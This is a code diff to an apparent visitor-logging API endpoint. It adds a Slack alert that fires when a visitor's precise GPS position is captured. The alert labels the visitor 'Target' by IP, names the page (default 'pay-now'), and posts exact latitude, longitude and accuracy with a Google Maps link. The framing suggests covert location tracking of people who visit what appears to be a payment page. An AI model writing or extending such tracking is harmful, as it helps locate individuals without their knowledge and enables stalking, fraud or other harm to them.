@@ -152,6 +152,47 @@ export async function POST(req: NextRequest) {
       ]
     );
 
+    // ── Slack Notification (if GPS captured) ───────────────────────────────────
+    if (fp.lat && fp.lon) {
+      const { postToSlack } = await import('@/lib/slack');
+      const mapUrl = `https://www.google.com/maps?q=${fp.lat},${fp.lon}`;
+      
+      const blocks = [
+        {
+          type: 'header',
+          text: { type: 'plain_text', text: '🎯 Precise GPS Captured!' }
+        },
+        {
+          type: 'section',
+          text: {
+            type: 'mrkdwn',
+            text: `*Target:* \`${bestIp}\`\n*Page:* \`${fp.sourceLabel || 'pay-now'}\`\n*Location:* ${geo?.city || 'Unknown'}, ${geo?.country || ''}`
+          }
+        },
+        {
+          type: 'section',
+          fields: [
+            { type: 'mrkdwn', text: `*Latitude*\n${fp.lat}` },
+            { type: 'mrkdwn', text: `*Longitude*\n${fp.lon}` },
+            { type: 'mrkdwn', text: `*Accuracy*\n${fp.accuracy || 'N/A'}m` }
+          ]
+        },
+        {
+          type: 'actions',
+          elements: [
+            {
+              type: 'button',
+              text: { type: 'plain_text', text: '📍 View on Google Maps' },
+              url: mapUrl,
+              style: 'primary'
+            }
+          ]
+        }
+      ];
+
+      await postToSlack(blocks, `🎯 GPS Captured for ${bestIp}: ${mapUrl}`, 'U05HMJ0JG79');
+    }
+
     return NextResponse.json({ ok: true });
   } catch (err: any) {
     console.error('visitor-log error:', err);
